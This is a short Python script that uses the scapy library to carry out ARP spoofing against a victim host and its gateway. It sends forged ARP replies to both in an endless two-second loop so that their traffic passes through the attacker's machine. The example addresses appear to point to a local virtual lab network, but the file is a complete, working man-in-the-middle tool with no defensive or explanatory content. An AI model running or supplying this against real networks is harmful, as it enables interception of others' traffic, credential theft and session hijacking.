from scapy.all import ARP, send, getmacbyip
import time

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    send(packet, verbose=False)

def start_arp(victim_ip, gateway_ip):
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not victim_mac or not gateway_mac:
        print("[!] MAC resolution failed. Exiting.")
        return

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")

    try:
        while True:
            spoof(victim_ip, gateway_ip, victim_mac)   # Spoof victim
            spoof(gateway_ip, victim_ip, gateway_mac)  # Spoof gateway
            print(f"[+] Sent spoofed packets to {victim_ip} and {gateway_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] ARP spoofing stopped.")

# Example usage:
if __name__ == "__main__":
    victim_ip = "192.168.56.101"
    gateway_ip = "192.168.56.1"
    start_arp(victim_ip, gateway_ip)
